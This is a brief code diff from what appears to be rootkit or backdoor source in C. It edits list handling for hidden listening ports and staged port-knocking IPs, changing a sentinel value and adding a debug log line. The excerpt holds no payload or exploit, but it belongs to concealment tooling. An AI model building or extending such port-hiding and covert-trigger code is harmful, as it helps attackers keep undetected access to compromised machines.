@@ -45,7 +45,7 @@ knock_list_t ips_stage3 = {
 knock_list_t_ptr ips_stage3_tail = &ips_stage3;
 
 lport_list_t hidden_lports = {
-    .lport = -1,
+    .lport = 0,
     .prev = NULL,
     .next = NULL,
 };
@@ -145,7 +145,7 @@ remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
 {
     lport_list_t_ptr i = find_lport_in_list(list, lport), ret = NULL;
 
-    if (i && (i->lport != -1)) {
+    if (i && (i->lport != 0)) {
         if (i->next)
             i->next->prev = i->prev;
         else
@@ -208,6 +208,9 @@ remove_knock_from_list(knock_list_t_ptr list, knock_list_t_ptr *tail, ip_t ip, i
     knock_list_t_ptr i = find_knock_in_list(list, ip, version), ret = NULL;
 
     if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
+            int knock;
+            memcpy(&knock, ip, 4);
+            DEBUG_INFO("removing ip %0X from list\n", knock);
         if (i->next)
             i->next->prev = i->prev;
         else
